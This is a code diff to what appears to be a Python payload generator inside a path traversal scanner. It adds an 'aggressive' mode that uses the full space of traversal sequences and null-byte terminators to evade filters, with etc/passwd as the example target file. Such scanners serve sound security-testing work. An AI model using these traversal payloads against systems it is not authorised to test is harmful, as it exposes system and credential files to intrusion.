@@ -66,15 +66,23 @@ def generate(
     prefixes: Optional[List[str]] = None,
     terminators: Optional[List[str]] = None,
     include_absolute: bool = True,
+    aggressive: bool = False,
 ) -> Iterator[str]:
     """
     Yield candidate traversal payloads for ``target_file`` (e.g. ``etc/passwd``).
 
     Payloads are yielded lazily so the engine can stop as soon as one confirms.
+    In the default (non-aggressive) profile a tight, high-signal subset of
+    separators, prefixes and terminators is used so a single URL finishes in
+    seconds; ``aggressive=True`` opens up the full cartesian space for evading
+    stubborn filters.
     """
-    steps = steps or TRAVERSAL_STEPS
-    prefixes = prefixes or PREFIXES
-    terminators = terminators or TERMINATORS
+    if steps is None:
+        steps = TRAVERSAL_STEPS if aggressive else TRAVERSAL_STEPS[:5]
+    if prefixes is None:
+        prefixes = PREFIXES if aggressive else ["", "/"]
+    if terminators is None:
+        terminators = TERMINATORS if aggressive else ["", "%00", "\x00"]
     target = target_file.lstrip("/")
 
     seen: set = set()
